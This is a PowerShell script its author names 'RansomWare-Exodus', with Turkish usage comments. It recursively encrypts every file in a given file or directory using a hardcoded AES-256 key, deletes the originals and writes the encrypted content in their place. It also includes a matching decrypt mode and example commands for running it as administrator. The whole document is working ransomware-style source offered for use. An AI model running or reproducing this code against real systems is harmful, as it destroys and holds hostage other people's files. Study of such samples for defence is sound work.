param(
   [string] $Type,
   [string] $Path,
   [string] $Action
)

[string]$global:WorkingPath= Get-Location
[string]$global:TargetFilePath=''

$aesKey = @(214, 160, 177, 131, 233, 79, 130, 8, 206, 79, 107, 26, 30, 42, 254, 5, 117, 120, 32, 131, 144, 247, 224, 220, 166, 212, 18, 153, 63, 23, 34, 50)


function SetDecryptedFileContent($contentValue)
{
    [io.file]::WriteAllBytes($TargetFilePath, $contentValue)
}
function DecryptFileContent($encryptedContent)
{
    $encryptedContent = ConvertTo-SecureString -String $encryptedContent -Key $aesKey
    $decryptedContent = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($encryptedContent)
    $decryptedContent = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decryptedContent)
    $decryptedContent=[convert]::FromBase64String($decryptedContent)
    return $decryptedContent
    
}

function RemoveOriginalFile()
{
    Remove-Item -Path $TargetFilePath -Force
}
function SetEncryptedFileContent($encryptedContent)
{

RemoveOriginalFile

Set-Content -Path $TargetFilePath -Value $encryptedContent

}

function  EncryptFileContent($fileContent) {
  
    $encryptedFileContent= ConvertTo-SecureString -String $fileContent -AsPlainText -Force
    $encryptedFileContent= ConvertFrom-SecureString -SecureString $encryptedFileContent -Key $aesKey

    return $encryptedFileContent
}

function GetFileContent($TargetFilePath)
{
    $thisFileToBase64= [convert]::ToBase64String((get-content $TargetFilePath -encoding byte))
    return $thisFileToBase64

}


function DecryptFolder()
{
    $TargetFiles = Get-ChildItem -Path $Path -Recurse -File | Select-Object -ExpandProperty FullName

    foreach($thisTargetFile in $TargetFiles)
    {
       $global:TargetFilePath = $thisTargetFile
       DecryptFile 
    }
}
function EncryptFolder()
{
    $TargetFiles = Get-ChildItem -Path $Path -Recurse -File | Select-Object -ExpandProperty FullName

    foreach($thisTargetFile in $TargetFiles)
    {
       $global:TargetFilePath = $thisTargetFile
       EncryptFile 
    }
}

function DecryptFile()
{
$decryptedFileContent= DecryptFileContent(Get-Content -Path $TargetFilePath)
SetDecryptedFileContent $decryptedFileContent   
}
function EncryptFile()
{
$fileContent = GetFileContent $TargetFilePath
$encryptedContent = EncryptFileContent $fileContent
SetEncryptedFileContent $encryptedContent
}

function FetchArguments()
{


if(Test-Path ($WorkingPath+$Path))
{
    $global:TargetFilePath = $WorkingPath+$Path
}else {
    $global:TargetFilePath = $Path
}

switch ($Action.ToLower()) {

    "encrypt" { 
        if($Type.ToLower() -eq "directory")
        {
           EncryptFolder
        }
        else
        {
           EncryptFile 
        }
     }

    "decrypt" { 
        if($Type -eq "directory")
        {
            DecryptFolder

        }
        else
        {
            DecryptFile 
        }
     }

    Default {}
}


}

function Init()
{
  FetchArguments
}


 Init

# Programı yönetici olarak  çalıştırarak belirttiğiniz spesifik bir dosyayı veya belirli bir dizinin altındaki tüm dosyaları
# uzantıdan bağımsız olarak şifreleyebilirsiniz. Yukarıda şifreleme sırasında kullanılacak olan örnek bir AES 256 bit anahtarı bulunmakta.
# Bu programı kullanarak hem dosyaları şifreleyebilir hem de şifrelerini çözerek normal hallerine geri döndürebilirsiniz.

# Örnek bir kullanım senaryosu:

  # Encryption:
  # .\RansomWare-Exodus.ps1 -Type Directory -Path C:\MyFolder -Action Encrypt

  # Decryption:
  # .\RansomWare-Exodus.ps1 -Type Directory -Path C:\MyFolder -Action Decrypt

# Argüman listesi:

  # -Type:
       # Directory
       # File
  # -Action:
       # Encrypt
       #Decrypt    


# Güvenlik gerekçekleri nedeniyle bu programın desteklediği maksimum dosya boyutu 60 KB'dır.

# This script has developed by Umut Deniz Yiğit
# You can reachout via umut.deniz@protonmail.com